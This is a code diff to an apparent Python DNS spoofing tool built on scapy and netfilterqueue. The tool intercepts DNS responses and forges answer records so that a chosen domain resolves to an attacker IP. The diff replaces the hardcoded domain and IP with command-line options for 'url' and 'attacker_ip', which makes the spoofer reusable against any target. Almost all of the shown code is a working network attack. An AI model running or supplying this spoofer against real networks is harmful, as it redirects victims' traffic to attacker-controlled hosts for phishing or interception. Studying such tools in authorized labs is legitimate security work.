@@ -15,6 +15,7 @@
 
 import netfilterqueue
 import scapy.all as scapy
+import argparse
 
 
 def process_packet(packet):
@@ -25,9 +26,9 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.DNSRR):  # check packet fields list => DNSRR stands for dns response record
         qname = scapy_packet[scapy.DNSRR].qname # syntax => var[module.field].subfield
 
-        if "www.bing.com" in qname:
+        if url in qname:
 
-            answer = scapy.DNSRR(rrname=qname, rdata='10.10.15.135')  # creates a DNSRR response to be send to the
+            answer = scapy.DNSRR(rrname=qname, rdata=attacker_ip)  # creates a DNSRR response to be send to the
             # target machine
             scapy_packet[scapy.DNS].an = answer  # sets payload to forged package
             scapy_packet[scapy.DNS].ancount = 1  # check pcks sent and match num with correct value
@@ -45,6 +46,24 @@ def process_packet(packet):
 
     # packet.drop()  # choose what to do and uncomment
     packet.accept()  # choose what to do and uncomment
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser(description='Introduce attack options')
+    parser.add_argument('-u', '--url', dest='url', help='URL to mock \n => E.G www.some_site.com')
+    parser.add_argument('--ip', dest='attacker_ip', help='Wanted destination\'s IP')
+    options = parser.parse_args()
+    if not options.url:
+        parser.error("[*] Introduce URL")
+    elif not options.attacker_ip:
+        parser.error("[*] Introduce ATTACKER IP")
+    return options
+
+
+parsed_options = get_arguments()
+
+url = parsed_options.url
+attacker_ip = parsed_options.attacker_ip
 
 
 queue = netfilterqueue.NetfilterQueue()
